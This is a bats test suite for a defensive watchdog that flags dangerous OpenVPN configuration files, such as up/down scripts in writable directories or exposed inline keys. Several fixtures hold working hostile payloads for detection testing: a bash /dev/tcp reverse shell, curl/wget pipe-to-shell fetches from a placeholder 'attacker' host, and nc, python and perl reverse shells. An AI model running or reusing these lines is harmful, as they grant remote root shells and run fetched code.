#!/usr/bin/env bats
# L2 bats functional tests for the openvpn-config-watchdog scan script.
#
# OpenVPN runs the script directives (up/down/route-up/client-connect/
# tls-verify/auth-user-pass-verify/…) AS ROOT on connect/route/auth events
# (gated by script-security) — a planted script directive is
# root-exec-on-VPN-event persistence (T1546). A .conf/.ovpn that is
# world-writable / non-root-owned, world-readable while carrying inline key
# material (`<key>`/`<tls-crypt>`/`secret`), or a script directive carrying an
# injection pattern (incl. a writable-root path), is alert.
#
# Run with: bats packaging/test/L2-openvpn-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd/openvpn-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    VPND="${TMP}/openvpn"; mkdir -p "${VPND}"
    CONF="${VPND}/client.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_OPENVPN_PROFILE="${PROFILE:-report}" \
    SELFDEF_OPENVPN_BASELINE="${BASELINE}" \
    SELFDEF_OPENVPN_DIRS="${DIRS_V:-$VPND}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# Benign client config: external key files (no inline key material), so a
# default-readable mode is not a key-exposure finding; a trusted up script.
seed_benign() {
    printf 'client\ndev tun\nremote vpn.example.com 1194\nup /etc/openvpn/up.sh\n' > "${CONF}"
}

@test "no openvpn configs → ok / no_openvpn" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_openvpn"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / openvpn_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"openvpn_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a script directive under a writable root → alert / openvpn_suspicious" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"openvpn_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a script directive with an injection pattern → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-readable config carrying inline key material → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\n<key>\n-----BEGIN PRIVATE KEY-----\n</key>\n' > "${CONF}"
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign config change → warn / openvpn_changed" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nremote vpn2.example.com 1194\nup /etc/openvpn/up.sh\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"openvpn_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign external-key config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious script directive" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — openvpn config inventory enumerates VPN-event root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (script directive under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /var/tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (script directive under /dev/shm): tmpfs writable-root coverage" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /dev/shm/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (down script directive — symmetric to up): writable-root → alert" {
    # OpenVPN has multiple script directives (up + down + client-connect +
    # route-up + tls-verify + auth-user-pass-verify). All run AS ROOT.
    seed_benign
    run_wd
    printf 'client\ndev tun\ndown /tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (route-up script directive — symmetric to up): writable-root → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nroute-up /tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in script directive): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (<tls-crypt> inline material world-readable → alert): inline-key axis coverage symmetric to <key>" {
    seed_benign
    run_wd
    printf 'client\ndev tun\n<tls-crypt>\n-----BEGIN OpenVPN Static key V1-----\n</tls-crypt>\n' > "${CONF}"
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-openvpn -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: openvpn-config-watchdog does NOT refresh baseline on suspicious-config detection — alert STAYS until operator updates)" {
    # T1546 VPN-event root-exec persistence primitive — alert MUST
    # persist across runs until operator explicitly re-baselines.
    # Sister to nm-vpn-plugin, gss-mech, ld-preload, musl-ld-path —
    # active-injection class never auto-trusts.
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (client-connect script directive — server-side symmetric to up): writable-root → alert" {
    # OpenVPN server uses client-connect (run per accepted client).
    # Sister script directive — equally root-execution surface.
    seed_benign
    run_wd
    printf 'server\ndev tun\nclient-connect /tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant in script directive): curl bootstrap → alert (sister to wget-pipe-sh axis)" {
    # Attacker may swap wget for curl, sh for bash. Watchdog must
    # catch both curl AND wget; both sh AND bash variants.
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "curl -fsSL http://attacker/p | bash"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-config scan: a second .conf in same dir ALSO scanned — not just first .conf)" {
    # OpenVPN dir may carry many client/server configs. A planted
    # config alongside benign one MUST be flagged.
    seed_benign
    printf 'client\ndev tun\nup /tmp/.evil2\n' > "${VPND}/client2.conf"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in script directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. OpenVPN script directives
    # (up/down/client-connect/route-up) run AS ROOT on every
    # VPN connect/disconnect/route-up — recurring trigger fires
    # the planted nc the moment a connection or route flap
    # happens. Locks the netcat axis on the VPN-event-trigger
    # root-exec persistence surface (T1546 — Event Triggered
    # Execution via VPN script directive).
    printf 'client\ndev tun\nup /bin/sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on OpenVPN script directive surface)" {
    # Sister to nc / curl|bash / wget|sh OpenVPN script
    # directive rev-shell variants already locked. Python is
    # on every Debian/Ubuntu host. Locks python axis on T1546
    # VPN-event-trigger root-exec persistence — script
    # directives run AS ROOT on every connect/disconnect/route-up.
    printf 'client\ndev tun\nup /bin/sh -c "python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on OpenVPN script directive surface)" {
    # Sister to nc / python -c / curl|bash / wget|sh OpenVPN
    # script directive rev-shell variants already locked. Perl
    # is on every Debian/Ubuntu host. Locks perl axis on T1546
    # VPN-event-trigger root-exec persistence — script
    # directives run AS ROOT on every connect/disconnect/route-up.
    printf 'client\ndev tun\nup /bin/sh -c "perl -e \\"use Socket;\\$i=\\\\\\"1.1.1.1\\\\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\\\\\"/bin/sh -i\\\\\\");\\""\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: script directive invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # VPN-event-trigger root-exec — script directives run AS ROOT
    # on every connect/disconnect/route-up.
    printf 'client\ndev tun\nup /var/tmp/staged_payload\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on openvpn-config surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The openvpn-config-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 VPN-event-trigger root-exec
    # persistence alert. Locks parser contract on the openvpn
    # .conf script directive detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'client\ndev tun\nremote vpn.example.com 1194\n' > "${CONF}"
    run_wd                                              # ok / baseline
    printf 'client\ndev tun\nup /tmp/.evil\n' > "${CONF}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # openvpn-config-watchdog runs ON the timer's scheduled fire
    # — scans OpenVPN .conf script directives for injection
    # patterns, emits a verdict, then exits. Type=simple would
    # break timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the openvpn-config-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd/selfdef-openvpn.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. openvpn-config-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # openvpn-config-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # openvpn-config-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'openvpn-config-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: openvpn-config-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. openvpn-config-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the openvpn-config-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (openvpn-config-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the openvpn-config-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (openvpn-config-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # openvpn-config-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (openvpn-config-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # openvpn-config-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (openvpn-config-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the openvpn-config-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (openvpn-config-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # openvpn-config-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (openvpn-config-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the openvpn-config-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (openvpn-config-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the openvpn-config-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (openvpn-config-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # openvpn-config-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (openvpn-config-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the openvpn-config-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (openvpn-config-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the openvpn-config-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (openvpn-config-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the openvpn-config-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (openvpn-config-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the openvpn-config-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}
